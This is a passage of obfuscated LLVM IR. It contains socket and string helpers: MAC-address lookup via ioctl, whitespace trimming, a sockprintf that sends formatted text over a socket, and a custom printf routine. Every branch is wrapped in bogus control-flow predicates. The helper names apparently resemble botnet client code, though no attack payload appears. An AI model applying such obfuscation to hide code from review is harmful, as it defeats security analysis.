  %157 = load i32, i32* %10, align 4
  %158 = call i32 (i32, i64, ...) @ioctl(i32 %157, i64 35111, %struct.ifreq* %19) #6
  store i32 0, i32* %18, align 4
  br label %159

; <label>:159:                                    ; preds = %originalBBpart223, %151
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %160, 6
  br i1 %161, label %162, label %193

; <label>:162:                                    ; preds = %159
  %163 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %164 = bitcast %union.anon.0* %163 to %struct.sockaddr*
  %165 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %164, i32 0, i32 1
  %166 = getelementptr inbounds [14 x i8], [14 x i8]* %165, i32 0, i32 0
  %167 = load i32, i32* %18, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  %170 = load i8, i8* %169, align 1
  %171 = load i32, i32* %18, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %172
  store i8 %170, i8* %173, align 1
  br label %174

; <label>:174:                                    ; preds = %162
  %175 = load i32, i32* @x.7
  %176 = load i32, i32* @y.8
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = load i32, i32* %18, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %18, align 4
  %185 = load i32, i32* @x.7
  %186 = load i32, i32* @y.8
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart223, label %originalBB18alteredBB

originalBBpart223:                                ; preds = %originalBB18
  br label %159

; <label>:193:                                    ; preds = %159
  br label %194

; <label>:194:                                    ; preds = %193, %145
  %195 = load i32, i32* @x.7
  %196 = load i32, i32* @y.8
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %194
  %203 = load i32, i32* %10, align 4
  %204 = call i32 @close(i32 %203)
  %205 = load i32, i32* @x.7
  %206 = load i32, i32* @y.8
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %213

; <label>:213:                                    ; preds = %originalBBpart227, %originalBBpart212, %originalBBpart28, %originalBBpart24
  %214 = load i32, i32* @x.7
  %215 = load i32, i32* @y.8
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %213
  %222 = load i32, i32* %9, align 4
  %223 = load i32, i32* @x.7
  %224 = load i32, i32* @y.8
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  ret i32 %222

originalBBalteredBB:                              ; preds = %originalBB, %0
  %231 = alloca i32, align 4
  %232 = alloca i32, align 4
  %233 = alloca %struct.sockaddr_in, align 4
  %234 = alloca i32, align 4
  %235 = alloca %struct.sockaddr_in, align 4
  %236 = alloca i32, align 4
  %237 = alloca i32, align 4
  %238 = alloca [4096 x i8], align 16
  %239 = alloca i8*, align 8
  %240 = alloca i32, align 4
  %241 = alloca %struct.ifreq, align 8
  %242 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %242, i32* %232, align 4
  %243 = load i32, i32* %232, align 4
  %244 = icmp eq i32 %243, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %117
  %245 = load i8*, i8** %17, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 9
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %249 = load i32, i32* %18, align 4
  %_ = sub i32 0, %249
  %gen = add i32 %_, 1
  %_19 = sub i32 0, %249
  %gen20 = add i32 %_19, 1
  %_21 = shl i32 %249, 1
  %250 = add nsw i32 %249, 1
  store i32 %250, i32* %18, align 4
  br label %originalBB18

originalBB25alteredBB:                            ; preds = %originalBB25, %194
  %251 = load i32, i32* %10, align 4
  %252 = call i32 @close(i32 %251)
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %213
  %253 = load i32, i32* %9, align 4
  br label %originalBB29
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  %38 = load i32, i32* @x.9
  %39 = load i32, i32* @y.10
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %46 = load i32, i32* @x.9
  %47 = load i32, i32* @y.10
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %54, label %57

; <label>:54:                                     ; preds = %originalBBpart2
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %5, align 4
  br label %23

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* @x.9
  %59 = load i32, i32* @y.10
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i32, i32* %4, align 4
  store i32 %66, i32* %3, align 4
  %67 = load i32, i32* @x.9
  %68 = load i32, i32* @y.10
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %75

; <label>:75:                                     ; preds = %107, %originalBBpart24
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %5, align 4
  %78 = icmp sle i32 %76, %77
  br i1 %78, label %79, label %110

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* @x.9
  %81 = load i32, i32* @y.10
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %79
  %88 = load i8*, i8** %2, align 8
  %89 = load i32, i32* %3, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = load i8*, i8** %2, align 8
  %94 = load i32, i32* %3, align 4
  %95 = load i32, i32* %4, align 4
  %96 = sub nsw i32 %94, %95
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %93, i64 %97
  store i8 %92, i8* %98, align 1
  %99 = load i32, i32* @x.9
  %100 = load i32, i32* @y.10
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %107

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i32, i32* %3, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %3, align 4
  br label %75

; <label>:110:                                    ; preds = %75
  %111 = load i8*, i8** %2, align 8
  %112 = load i32, i32* %3, align 4
  %113 = load i32, i32* %4, align 4
  %114 = sub nsw i32 %112, %113
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %111, i64 %115
  store i8 0, i8* %116, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %36
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %117 = load i32, i32* %4, align 4
  store i32 %117, i32* %3, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %79
  %118 = load i8*, i8** %2, align 8
  %119 = load i32, i32* %3, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = load i8*, i8** %2, align 8
  %124 = load i32, i32* %3, align 4
  %125 = load i32, i32* %4, align 4
  %_ = sub i32 %124, %125
  %gen = mul i32 %_, %125
  %126 = sub nsw i32 %124, %125
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %123, i64 %127
  store i8 %122, i8* %128, align 1
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #6
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #6
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %originalBBpart2153, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %670

; <label>:17:                                     ; preds = %12
  %18 = load i32, i32* @x.13
  %19 = load i32, i32* @y.14
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 37
  %30 = load i32, i32* @x.13
  %31 = load i32, i32* @y.14
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %594

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %38
  br label %670

; <label>:46:                                     ; preds = %38
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %611

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %5, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %60

; <label>:60:                                     ; preds = %57, %52
  br label %61

; <label>:61:                                     ; preds = %originalBBpart213, %60
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 48
  br i1 %65, label %66, label %87

; <label>:66:                                     ; preds = %61
  %67 = load i32, i32* @x.13
  %68 = load i32, i32* @y.14
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i8*, i8** %5, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %5, align 8
  %77 = load i32, i32* %8, align 4
  %78 = or i32 %77, 2
  store i32 %78, i32* %8, align 4
  %79 = load i32, i32* @x.13
  %80 = load i32, i32* @y.14
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br label %61

; <label>:87:                                     ; preds = %61
  br label %88

; <label>:88:                                     ; preds = %originalBBpart260, %87
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sge i32 %91, 48
  br i1 %92, label %93, label %114

; <label>:93:                                     ; preds = %88
  %94 = load i32, i32* @x.13
  %95 = load i32, i32* @y.14
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %93
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp sle i32 %104, 57
  %106 = load i32, i32* @x.13
  %107 = load i32, i32* @y.14
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %114

; <label>:114:                                    ; preds = %originalBBpart217, %88
  %115 = phi i1 [ false, %88 ], [ %105, %originalBBpart217 ]
  br i1 %115, label %116, label %160

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* @x.13
  %118 = load i32, i32* @y.14
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %116
  %125 = load i32, i32* %7, align 4
  %126 = mul nsw i32 %125, 10
  store i32 %126, i32* %7, align 4
  %127 = load i8*, i8** %5, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = sub nsw i32 %129, 48
  %131 = load i32, i32* %7, align 4
  %132 = add nsw i32 %131, %130
  store i32 %132, i32* %7, align 4
  %133 = load i32, i32* @x.13
  %134 = load i32, i32* @y.14
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart256, label %originalBB19alteredBB

originalBBpart256:                                ; preds = %originalBB19
  br label %141

; <label>:141:                                    ; preds = %originalBBpart256
  %142 = load i32, i32* @x.13
  %143 = load i32, i32* @y.14
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %141
  %150 = load i8*, i8** %5, align 8
  %151 = getelementptr inbounds i8, i8* %150, i32 1
  store i8* %151, i8** %5, align 8
  %152 = load i32, i32* @x.13
  %153 = load i32, i32* @y.14
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %88

; <label>:160:                                    ; preds = %114
  %161 = load i32, i32* @x.13
  %162 = load i32, i32* @y.14
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %160
  %169 = load i8*, i8** %5, align 8
  %170 = load i8, i8* %169, align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 115
  %173 = load i32, i32* @x.13
  %174 = load i32, i32* @y.14
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %172, label %181, label %247

; <label>:181:                                    ; preds = %originalBBpart264
  %182 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %183 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 8
  %185 = icmp ule i32 %184, 40
  br i1 %185, label %186, label %192

; <label>:186:                                    ; preds = %181
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 3
  %188 = load i8*, i8** %187, align 8
  %189 = getelementptr i8, i8* %188, i32 %184
  %190 = bitcast i8* %189 to i32*
  %191 = add i32 %184, 8
  store i32 %191, i32* %183, align 8
  br label %197

; <label>:192:                                    ; preds = %181
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 2
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to i32*
  %196 = getelementptr i8, i8* %194, i32 8
  store i8* %196, i8** %193, align 8
  br label %197

; <label>:197:                                    ; preds = %192, %186
  %198 = phi i32* [ %190, %186 ], [ %195, %192 ]
  %199 = load i32, i32* @x.13
  %200 = load i32, i32* @y.14
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %197
  %207 = load i32, i32* %198, align 4
  %208 = sext i32 %207 to i64
  %209 = inttoptr i64 %208 to i8*
  store i8* %209, i8** %11, align 8
  %210 = load i8**, i8*** %4, align 8
  %211 = load i8*, i8** %11, align 8
  %212 = icmp ne i8* %211, null
  %213 = load i32, i32* @x.13
  %214 = load i32, i32* @y.14
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %212, label %221, label %239

; <label>:221:                                    ; preds = %originalBBpart268
  %222 = load i32, i32* @x.13
  %223 = load i32, i32* @y.14
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %221
  %230 = load i8*, i8** %11, align 8
  %231 = load i32, i32* @x.13
  %232 = load i32, i32* @y.14
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %240

; <label>:239:                                    ; preds = %originalBBpart268
  br label %240

; <label>:240:                                    ; preds = %239, %originalBBpart272
  %241 = phi i8* [ %230, %originalBBpart272 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), %239 ]
  %242 = load i32, i32* %7, align 4
  %243 = load i32, i32* %8, align 4
  %244 = call i32 @prints(i8** %210, i8* %241, i32 %242, i32 %243)
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, %244
  store i32 %246, i32* %9, align 4
  br label %651

; <label>:247:                                    ; preds = %originalBBpart264
  %248 = load i32, i32* @x.13
  %249 = load i32, i32* @y.14
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %247
  %256 = load i8*, i8** %5, align 8
  %257 = load i8, i8* %256, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 100
  %260 = load i32, i32* @x.13
  %261 = load i32, i32* @y.14
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %259, label %268, label %325

; <label>:268:                                    ; preds = %originalBBpart276
  %269 = load i32, i32* @x.13
  %270 = load i32, i32* @y.14
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %268
  %277 = load i8**, i8*** %4, align 8
  %278 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %279 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 8
  %281 = icmp ule i32 %280, 40
  %282 = load i32, i32* @x.13
  %283 = load i32, i32* @y.14
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %281, label %290, label %312

; <label>:290:                                    ; preds = %originalBBpart280
  %291 = load i32, i32* @x.13
  %292 = load i32, i32* @y.14
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
